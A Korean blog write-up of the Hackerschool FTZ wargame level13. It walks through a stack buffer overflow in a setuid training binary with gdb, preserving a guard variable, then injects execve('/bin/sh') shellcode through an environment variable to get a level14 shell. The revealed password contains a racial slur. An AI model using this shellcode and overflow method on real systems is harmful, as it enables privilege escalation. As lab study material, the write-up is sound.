---
layout: post
title: "Hackerschool FTZ-level13"
categories: [Hackerschool-FTZ]
tags: [pwnable]
redirect_from:
 - /2019/05/25
---
```bash
login as: level13 
level13@~~~~'s password: 
[level13@ftz level13]$ ls 
attackme  hint  public_html  tmp 
[level13@ftz level13]$ cat hint 

#include  <stdlib.h>

main(int argc, char *argv[]) 
{ 
   long i=0x1234567; 
   char buf[1024]; 

   setreuid( 3094, 3094 ); 
   if(argc > 1) 
   strcpy(buf,argv[1]); 

   if(i != 0x1234567) { 
   printf(" Warnning: Buffer Overflow !!! \n"); 
   kill(0,11); 
   } 
} 

[level13@ftz level13]$
```


level13/have no clue로 접속하자.

hint를 보니, 버퍼오버플로우는 맞다.

그러나 i에 0x01234567이라는 주소값을 부여한다.

버퍼오버플로우를 하며 i의 주소값을 건드리면 프로그램이 종료된다.

한번 gdb로 살펴보자.


```bash
[level13@ftz level13]$ cp hint /tmp/bof.c 
[level13@ftz tmp]$ cd /tmp 
[level13@ftz tmp]$ ls 
bof.c  mysql.sock 
[level13@ftz tmp]$ gcc -o bof bof.c 
[level13@ftz tmp]$



[level13@ftz tmp]$ gdb bof 
GNU gdb Red Hat Linux (5.3post-0.20021129.18rh) 
Copyright 2003 Free Software Foundation, Inc. 
GDB is free software, covered by the GNU General Public License, and you are 
welcome to change it and/or distribute copies of it under certain conditions. 
Type "show copying" to see the conditions. 
There is absolutely no warranty for GDB.  Type "show warranty" for details. 
This GDB was configured as "i386-redhat-linux-gnu"... 
(gdb) disas main 
Dump of assembler code for function main: 
0x080483c8 <main+0>:    push   %ebp 
0x080483c9 <main+1>:    mov    %esp,%ebp 
0x080483cb <main+3>:    sub    $0x418,%esp 
0x080483d1 <main+9>:    and    $0xfffffff0,%esp 
0x080483d4 <main+12>:   mov    $0x0,%eax 
0x080483d9 <main+17>:   sub    %eax,%esp 
0x080483db <main+19>:   movl   $0x1234567,0xfffffff4(%ebp) 
0x080483e2 <main+26>:   sub    $0x8,%esp 
0x080483e5 <main+29>:   push   $0xc16 
0x080483ea <main+34>:   push   $0xc16 
0x080483ef <main+39>:   call   0x80482e8  <setreuid>
0x080483f4 <main+44>:   add    $0x10,%esp 
0x080483f7 <main+47>:   cmpl   $0x1,0x8(%ebp) 
0x080483fb <main+51>:   jle    0x8048417 <main+79> 
0x080483fd <main+53>:   sub    $0x8,%esp 
0x08048400 <main+56>:   mov    0xc(%ebp),%eax 
0x08048403 <main+59>:   add    $0x4,%eax 
0x08048406 <main+62>:   pushl  (%eax) 
0x08048408 <main+64>:   lea    0xfffffbe8(%ebp),%eax 
0x0804840e <main+70>:   push   %eax 
0x0804840f <main+71>:   call   0x8048308  <strcpy>
0x08048414 <main+76>:   add    $0x10,%esp 
0x08048417 <main+79>:   cmpl   $0x1234567,0xfffffff4(%ebp) 
0x0804841e <main+86>:   je     0x804843f <main+119> 
0x08048420 <main+88>:   sub    $0xc,%esp 
0x08048423 <main+91>:   push   $0x8048520 
0x08048428 <main+96>:   call   0x80482d8  <printf>
0x0804842d <main+101>:  add    $0x10,%esp 
0x08048430 <main+104>:  sub    $0x8,%esp 
0x08048433 <main+107>:  push   $0xb 
0x08048435 <main+109>:  push   $0x0 
0x08048437 <main+111>:  call   0x80482f8  <kill>
0x0804843c <main+116>:  add    $0x10,%esp 
0x0804843f <main+119>:  leave 
0x08048440 <main+120>:  ret 
0x08048441 <main+121>:  nop 
0x08048442 <main+122>:  nop 
0x08048443 <main+123>:  nop 
End of assembler dump. 
(gdb) 
```



main+19에서 i에게 주소값을 부여하는 모습이 보인다. i의 주소값은 0xfffffff4.

main+64에서 strcpy의 인좌에 buf가 들어가는 모습이 보인다.

buf의 주소값은 0xfffffbe8.

main+104에서 dummy에 8만큼 부여하는 것이 보인다.

일단 아무 값이나 넣어서 위치를 확인해보자.


```bash
(gdb) b*main+79 
Breakpoint 1 at 0x8048417 
(gdb) r AAAAAAAA 
Starting program: /tmp/bof AAAAAAAA 

Breakpoint 1, 0x08048417 in main ()
```


i값이 그대로인지 확인하는 main+79에 break를 걸었다.

gdb의 사용법을 잘 모른다면 이곳을 방문하자.

https://mintnlatte.tistory.com/581

아무 값이나 채워두고 esp레지스터를 확인했다.


```bash
(gdb) x/264x $esp 

0xbfffdd60:     0x41414141      0x41414141      0x00000000      0x00000000 
0xbfffdd70:     0x00000000      0x00000000      0x00000000      0x00000000 
0xbfffdd80:     0x00000000      0x00000000      0x00000000      0x00000000 
0xbfffdd90:     0x00000000      0x00000000      0x400126d0      0x400126c8 
0xbfffdda0:     0x400126ca      0x4001552c      0x514d846e      0x000001bf 
0xbfffddb0:     0x00000000      0x00000000      0x00000000      0x00000000 

.........

0xbfffe160:     0x42130a14      0x4000c660      0xbfffe178      0x01234567 
```


맨 위 A의 아스키코드인 41이 채워지는 것이 보인다.

그리고 저 밑에 내리면 0x01234567도 볼 수 있다.

i(fffffff4) - buf(fffffbe8) = 1036

1036개의 의미없는 값을 채워보자.


```bash
(gdb) r $(python -c 'print"A"*1036') 
The program being debugged has been started already. 
Start it from the beginning? (y or n) y 

Starting program: /tmp/bof $(python -c 'print"A"*1036') 

Breakpoint 1, 0x08048417 in main () 
(gdb) x/264x $esp 
0xbfffd860:     0x41414141      0x41414141      0x41414141      0x41414141 
0xbfffd870:     0x41414141      0x41414141      0x41414141      0x41414141 
0xbfffd880:     0x41414141      0x41414141      0x41414141      0x41414141

..... 
0xbfffdc60:     0x41414141      0x41414141      0x41414141      0x01234500
```




0x01234567의 값이 살짝 바뀌었다. 그럼 저곳에 0x01234567을 채워넣자.


```bash
(gdb) r $(python -c 'print"A"*1036+"\x67\x45\x23\x01"') 
The program being debugged has been started already. 
Start it from the beginning? (y or n) uy^H^H 
Please answer y or n. 
The program being debugged has been started already. 
Start it from the beginning? (y or n) y 

Starting program: /tmp/bof $(python -c 'print"A"*1036+"\x67\x45\x23\x01"') 

Breakpoint 1, 0x08048417 in main () 
(gdb) x/264x $esp 
0xbfffeae0:     0x41414141      0x41414141      0x41414141      0x41414141 
0xbfffeaf0:     0x41414141      0x41414141      0x41414141      0x41414141 
0xbfffeb00:     0x41414141      0x41414141      0x41414141      0x41414141

....

0xbfffeee0:     0x41414141      0x41414141      0x41414141      0x01234567
```


이제 i의 값도 그대로 보존했다.

이제 RET어드레스까지 값을 채우고 쉘 코드를 넣으면 되겠다.

저 위에서 보았듯, dummy를 끝에 8 부여한다.

그러니까 dummy(8) + SFP(4) = 12

12개의 값을 채우고 쉘을 실행시키는 주소를 넣자.

우선 그러려면 환경변수에 등록부터 하자.


```bash
export code=$(python -c 'print"\x90"*100+"\x31\xc0\x31\xdb\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"')
```

지금까지 사용한 find 프로그램도 만들자.


```bash
[level13@ftz level13]$ cd /tmp 
[level13@ftz tmp]$ vi find.c 
[level13@ftz tmp]$ cat find.c 
#include 
int main() 
{ 
        printf("%x\n",getenv("code")); 
} 
[level13@ftz tmp]$ gcc -o find find.c 
[level13@ftz tmp]$ ./find 
bfffff29 
[level13@ftz tmp]$
```


쉘 코드 주소:bfffff29
```bash
[level13@ftz level13]$ ./attackme $(python -c 'print"\x90"*1036+"\x67\x45\x23\x01"+"\x90"*12+"\x29\xff\xff\xbf"') 
sh-2.05b$ whoami 
level14 
sh-2.05b$ my-pass 
TERM environment variable not set. 

Level14 Password is "what that nigga want?". 

sh-2.05b$
```


답을 구했다.

level14's password:"what that nigga want?"

비밀번호가 좀.....